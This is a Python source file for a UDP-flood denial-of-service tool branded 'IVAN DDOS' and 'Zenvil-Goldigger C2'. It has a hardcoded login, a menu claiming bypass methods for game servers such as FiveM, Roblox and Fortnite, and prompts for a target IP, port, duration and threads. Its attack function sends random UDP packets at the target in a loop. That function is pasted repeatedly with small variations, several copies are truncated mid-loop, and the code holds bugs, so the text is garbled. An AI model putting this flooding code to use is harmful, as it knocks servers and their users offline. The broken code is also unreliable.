import os
import codecs
import sys
import random
import threading
import time
import socket
import getpass
from time import time as tt

os.system("clear")

print("""
\033[93m             ╔╦╗╔═╗╔═╗╔╦╗╦ ╦ \033[90m╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦
\033[93m                ║║║╣ ╠═╣ ║ ╠═╣─\033[90m──╚═╗╠═╣╠═╣ ║║║ ║║║║
\033[93m             ═╩╝╚═╝╩ ╩ ╩ ╩ ╩   \033[90m╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝
\033[93m            💻 Login The D\033[94mE Death Shadow 💻
\033[93m           ╦═══════════════════════════════════════╦
""")

def login():
    user = "IvanDDoS"
    passwd = "IvanDDoS"
    username = input("</> Input Username Tools: ")
    password = getpass.getpass(prompt='</> Input Password Tools: ')
    if username != user or password != passwd:
        print(" </> You have successfully entered your password. Have fun")
        print("</> You entered the wrong password. Please log in/out")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to Zenvil-Goldigger C2!")
        time.sleep(0.3)

login()

os.system("clear")

print("""\033[93m

▒███████▒▓█████  ███▄    █ ██▒   █▓ ██▓ ██▓      ▄████  ▒█████   ██▓    ▓█████▄  ██▓  ▄████   ▄████ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █▓██░   █▒▓██▒▓██▒     ██▒ ▀█▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒▓██  █▒░▒██▒▒██░    ▒██░▄▄▄░▒██░  ██▒▒██░    ░██   █▌▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒ ▒██ █░░░██░▒██░    ░▓█  ██▓▒██   ██░▒██░    ░▓█▄   ▌░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒▒██░   ▓██░  ▒▀█░  ░██░░██████▒░▒▓███▀▒░ ████▓▒░░██████▒░▒████▓ ░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒   ░ ▐░  ░▓  ░ ▒░▓  ░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░  ░ ░░   ▒ ░░ ░ ▒  ░  ░   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░      ░   ░ ░     ░░   ▒ ░  ░ ░   ░ ░   ░ ░ ░ ░ ▒    ░ ░    ░ ░  ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ 
  ░ ░       ░  ░         ░      ░   ░      ░  ░      ░     ░ ░      ░  ░   ░     ░        ░       ░    ░  ░   ░     
░                              ░                                         ░                                          

\033[94m   [ LAYER4-METHODS]
\033[93m   [ UDP ]        [UDP-DOWN]        [UDP-BYPASSED]
\033[93m   [ TCP ]        [TCP-DOWN]        [TCP-BYPASSED]
\033[93m   [ OVH ]       [OVH-DOWN]        [OVH-BYPASSED]
\033[93m   [ ULTRAH ]      [ULTRAH-DOWN]       [ULTRAH-BYPASSED]
\033[93m   [ BYPASSED ]       [BYPASSEDV2]        [BYPASSEDV3]
\033[93m   [STD]        [SYN]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]


\033[94m   [ LAYER7-METHODS]
\033[93m   [ CLOUDFLARE ]        [HTTP-STM]        [?]
\033[93m   [HTTP-SLD]        [DDOS-GUARD]        [?]      [?]      [?]
\033[93m   [DNS]        [VPN]        [VPS]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
\033[93m   [?]        [?]        [?]      [?]      [?]
                   
\033[93m   [ Source :  IVAN X DDOS ]
\033[93m   [ Basic Tools :  udp-flood and tcp-flood BYPASSES ]
\033[93m   [ Developer Tools : AKA-IVANDDOS ]
\033[93m   [ Methode : BYPASS FIVEM/GTPS/ROBLOX/FORTNITE/SAMP ]
\033[93m   [ Ping Tools :  Tergantung Dari Packetnya  ]
""")

ip = str(input("\033[94m====> Enter The IP/Host Target   : "))
port = int(input("\033[94m====> Enter The PORT Target   : "))
time = int(input("\033[94m====> How Much You Sent Enter Time   : "))
threads = int(input("\033[94m====> How Much You Sent Threads   : "))
choice = str(input("\033[94m====> Masukan Methods Tools   : "))

os.system("clear")

brand = """\033[95m

▒███████▒▓█████  ███▄    █ ██▒   █▓ ██▓ ██▓      ▄████  ▒█████   ██▓    ▓█████▄  ██▓  ▄████   ▄████ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █▓██░   █▒▓██▒▓██▒     ██▒ ▀█▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒▓██  █▒░▒██▒▒██░    ▒██░▄▄▄░▒██░  ██▒▒██░    ░██   █▌▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒ ▒██ █░░░██░▒██░    ░▓█  ██▓▒██   ██░▒██░    ░▓█▄   ▌░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒▒██░   ▓██░  ▒▀█░  ░██░░██████▒░▒▓███▀▒░ ████▓▒░░██████▒░▒████▓ ░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒   ░ ▐░  ░▓  ░ ▒░▓  ░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░  ░ ░░   ▒ ░░ ░ ▒  ░  ░   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░      ░   ░ ░     ░░   ▒ ░  ░ ░   ░ ░   ░ ░ ░ ░ ▒    ░ ░    ░ ░  ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ 
  ░ ░       ░  ░         ░      ░   ░      ░  ░      ░     ░ ░      ░  ░   ░     ░        ░       ░    ░  ░   ░     
░                              ░                                         ░                                          

\033[93m   [ Source :  IVAN X DDOS ]
\033[93m   [ Basic Tools :  Udp-Flood And Tcp-Flood ]
\033[93m   [ Developer Tools : AKA-IVANDDOS ]
\033[93m   [ Methode : BYPASS FIVEM/GTPS/ROBLOX/FORTNITE/SAMP ]
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
